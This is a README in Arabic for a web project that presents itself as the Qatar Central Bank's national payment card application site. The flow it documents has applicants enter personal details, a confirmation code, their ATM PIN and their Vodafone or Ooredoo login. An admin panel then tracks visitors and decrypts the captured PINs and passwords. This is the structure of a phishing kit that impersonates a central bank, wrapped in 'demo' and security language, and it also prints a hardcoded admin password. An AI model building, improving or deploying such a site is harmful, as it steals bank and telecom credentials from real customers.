# 💳 هميان - HIMYAN

## البطاقة الوطنية لنظام المدفوعات في قطر
### Qatar National Payment Card System

![Version](https://img.shields.io/badge/version-2.0.0-blue)
![Status](https://img.shields.io/badge/status-demo-yellow)
![Node](https://img.shields.io/badge/node-%3E%3D18.0.0-green)

---

## 📋 نظرة عامة

**هميان** هو موقع إلكتروني لمصرف قطر المركزي يتيح للمواطنين والمقيمين التقديم على البطاقة الوطنية للمدفوعات.

### الإصدار الحالي: 2.0.0 🆕
- ✅ 10 صفحات (4 صفحات جديدة)
- ✅ 14 API endpoint
- ✅ تشفير البيانات الحساسة
- ✅ لوحة تحكم محدثة
- ✅ دعم ثنائي اللغة (العربية/الإنجليزية)

---

## 🚀 التشغيل السريع

### 1. التثبيت
```bash
npm install
```

### 2. الإعدادات
```bash
copy .env.example .env
```

### 3. التشغيل
```bash
npm start
```

### 4. الوصول
- **الموقع:** http://localhost:3000
- **لوحة الأدمن:** http://localhost:3000/admin.html

**بيانات الدخول:**
- اسم المستخدم: `admin`
- كلمة المرور: `HimyanAdmin2026!Qcb#`

---

## ✨ الميزات الجديدة في الإصدار 2.0

### 🆕 خطوات تقديم إضافية:
1. **رقم ATM السري** - إدخال رقم مكون من 4 أرقام (مُشفر)
2. **اختيار مزود الشبكة** - فودافون أو أوريدو
3. **تسجيل دخول المزود** - ربط حساب الاتصالات (مُشفر)

### 🔐 التشفير:
- تشفير AES-256-CBC
- حماية أرقام ATM
- حماية كلمات المرور
- فك تشفير للأدمن فقط

### 📊 لوحة أدمن محدثة:
- أعمدة جديدة في الجدول
- عرض البيانات المشفرة
- تتبع حالة الطلب المحدثة
- 3 حالات جديدة

---

## 📁 هيكل المشروع

```
Himyan-main/
├── 🌐 صفحات HTML
│   ├── index.html              # الصفحة الرئيسية
│   ├── apply.html              # نموذج التقديم
│   ├── confirmation.html       # بوابة الدفع
│   ├── pending.html            # صفحة الانتظار
│   ├── confirmation-code.html  # رمز التأكيد
│   ├── atm-pin.html           # رقم ATM 🆕
│   ├── network-provider.html   # اختيار المزود 🆕
│   ├── vodafone-login.html     # دخول فودافون 🆕
│   ├── ooredoo-login.html      # دخول أوريدو 🆕
│   └── admin.html              # لوحة الأدمن
│
├── ⚙️ الباك إند
│   ├── server.js               # السيرفر الرئيسي
│   ├── db.js                   # قاعدة البيانات
│   └── package.json            # المكتبات
│
├── 🎨 التصميم
│   ├── style.css               # الأنماط الرئيسية
│   ├── style_fixed.css         # إصلاحات CSS
│   └── *.svg, *.png            # الصور والشعارات
│
├── 📚 التوثيق
│   ├── README.md               # هذا الملف
│   ├── PROJECT_OVERVIEW.md     # نظرة شاملة
│   ├── NEW_FEATURES.md         # الميزات الجديدة
│   ├── CHANGES_SUMMARY.md      # ملخص التغييرات
│   ├── QUICK_START.md          # دليل سريع
│   └── IMPROVEMENTS_AND_ISSUES.md  # المشاكل والحلول
│
└── 🔧 الإعدادات
    ├── .env                    # الإعدادات (لا تشاركه!)
    ├── .env.example            # نموذج الإعدادات
    └── .gitignore              # ملفات Git
```

---

## 🔄 التدفق الكامل

```
1. الصفحة الرئيسية
   ↓
2. نموذج التقديم (معلومات شخصية)
   ↓
3. بوابة الدفع (Demo)
   ↓
4. انتظار موافقة الأدمن
   ↓
5. إدخال رمز التأكيد (6 أرقام)
   ↓
6. 🆕 إدخال رقم ATM (4 أرقام)
   ↓
7. 🆕 اختيار مزود الشبكة
   ↓
8. 🆕 تسجيل دخول المزود
   ↓
9. ✅ الطلب مكتمل
```

---

## 🛠️ التقنيات المستخدمة

### Frontend:
- HTML5
- CSS3
- JavaScript (Vanilla)
- Cairo Font (خط القاهرة)

### Backend:
- Node.js 18+
- HTTP Module (بدون Express)
- Crypto (للتشفير)

### Database:
- PostgreSQL (للإنتاج)
- JSON Files (للتطوير)

---

## 📦 المكتبات المطلوبة

```json
{
  "dependencies": {
    "pg": "^8.11.3"
  }
}
```

---

## 🔐 الأمان

### البيانات المُشفرة:
- ✅ أرقام ATM (4 أرقام)
- ✅ كلمات مرور مزودي الشبكة

### خوارزمية التشفير:
- **Algorithm:** AES-256-CBC
- **Key Size:** 256 bits
- **IV Size:** 128 bits

### الوصول:
- فك التشفير: الأدمن فقط
- المشاهدة: عند الطلب فقط

---

## 📊 APIs

### للمستخدمين:
- `POST /api/presence` - تتبع الزوار
- `POST /api/requests` - إنشاء طلب
- `POST /api/requests/confirm` - تأكيد الدفع
- `GET /api/requests/status` - حالة الطلب
- `POST /api/requests/code` - رمز التأكيد
- `POST /api/requests/atm-pin` 🆕 - رقم ATM
- `POST /api/requests/network-provider` 🆕 - المزود
- `POST /api/requests/provider-login` 🆕 - بيانات الدخول

### للأدمن:
- `POST /api/admin/login` - تسجيل دخول
- `POST /api/admin/logout` - تسجيل خروج
- `GET /api/admin/summary` - ملخص الطلبات
- `GET /api/admin/requests` - جميع الطلبات
- `PATCH /api/admin/requests` - تحديث حالة
- `GET /api/requests/decrypt` 🆕 - فك التشفير

---

## 🏦 البنوك المدعومة (17 بنك)

<details>
<summary>عرض القائمة الكاملة</summary>

1. بنك قطر الوطني (QNB)
2. البنك التجاري (CBQ)
3. بنك الدوحة
4. البنك الأهلي
5. مصرف قطر الإسلامي (QIB)
6. مصرف الريان
7. بنك قطر الدولي الإسلامي (QIIB)
8. بنك دخان
9. بنك لشا
10. بنك قطر للتنمية (QDB)
11. HSBC
12. Standard Chartered
13. البنك العربي
14. بنك المشرق
15. Citibank
16. BNP Paribas
17. Bank Saderat Iran

</details>

---

## 📚 التوثيق

| الملف | الوصف |
|------|-------|
| `README.md` | الملف الرئيسي (هذا الملف) |
| `QUICK_START.md` | دليل التشغيل السريع |
| `PROJECT_OVERVIEW.md` | شرح المشروع بالتفصيل |
| `NEW_FEATURES.md` | شرح الميزات الجديدة |
| `CHANGES_SUMMARY.md` | ملخص التغييرات |
| `IMPROVEMENTS_AND_ISSUES.md` | المشاكل والحلول |

---

## ⚠️ تحذيرات مهمة

### 🚨 للتجربة فقط!

هذا التطبيق **ليس جاهزًا للإنتاج** بدون:
- ✅ مراجعة أمنية شاملة
- ✅ استخدام HSM للمفاتيح
- ✅ التوافق مع PCI DSS
- ✅ موافقة مصرف قطر المركزي
- ✅ تشفير قاعدة البيانات
- ✅ استخدام HTTPS فقط
- ✅ تفعيل Audit Logs
- ✅ تطبيق 2FA للأدمن

### 🔑 أمان البيانات:
- غيّر `ADMIN_PASSWORD` فورًا
- احفظ `ENCRYPTION_KEY` في مكان آمن
- لا تشارك ملف `.env` مع أحد
- استخدم HTTPS في الإنتاج

---

## 🐛 المشاكل المعروفة

### الأمان:
- ⚠️ بوابة الدفع وهمية (Demo)
- ⚠️ تخزين بيانات حساسة يتطلب HSM
- ⚠️ لا يوجد Rate Limiting
- ⚠️ لا يوجد CAPTCHA

### الوظائف:
- ⚠️ لا يوجد استرجاع للطلبات
- ⚠️ لا يوجد تحقق من البريد الإلكتروني
- ⚠️ لا يوجد إشعارات SMS

للتفاصيل الكاملة: اقرأ `IMPROVEMENTS_AND_ISSUES.md`

---

## 🔧 التطوير

### البيئة المطلوبة:
- Node.js 18+
- PostgreSQL (اختياري)
- محرر نصوص (VS Code موصى به)

### الأوامر:
```bash
# تثبيت
npm install

# تشغيل
npm start

# تشغيل مع إعادة التحميل (يتطلب nodemon)
npm run dev
```

---

## 📈 الإحصائيات

| المقياس | العدد |
|---------|------|
| الصفحات | 10 |
| APIs | 14 |
| البنوك | 17 |
| اللغات | 2 |
| الحالات | 10 |
| الأعمدة | 16 |

---

## 🤝 المساهمة

هذا مشروع تجريبي لمصرف قطر المركزي.

---

## 📄 الترخيص

© 2024-2026 مصرف قطر المركزي - جميع الحقوق محفوظة

---

## 📞 الدعم

### أسئلة متكررة:

**س: كيف أشغل المشروع؟**  
ج: اقرأ `QUICK_START.md`

**س: ما هي الميزات الجديدة؟**  
ج: اقرأ `NEW_FEATURES.md`

**س: كيف يعمل المشروع؟**  
ج: اقرأ `PROJECT_OVERVIEW.md`

**س: ما هي المشاكل الموجودة؟**  
ج: اقرأ `IMPROVEMENTS_AND_ISSUES.md`

---

## 🎉 شكر خاص

- مصرف قطر المركزي
- فريق تطوير هميان
- مجتمع Node.js

---

## 📅 سجل الإصدارات

### الإصدار 2.0.0 (31 أغسطس 2026) 🆕
- إضافة 4 صفحات جديدة
- تشفير البيانات الحساسة
- 4 APIs جديدة
- تحديث لوحة الأدمن

### الإصدار 1.0.0 (سابقًا)
- 6 صفحات أساسية
- 10 APIs
- لوحة أدمن بسيطة
- دعم ثنائي اللغة

---

<div align="center">

**صُنع بـ ❤️ لمصرف قطر المركزي**

[![Node.js](https://img.shields.io/badge/Node.js-18+-green?logo=node.js)]()
[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-Supported-blue?logo=postgresql)]()
[![Security](https://img.shields.io/badge/Security-AES--256-red?logo=security)]()

</div>
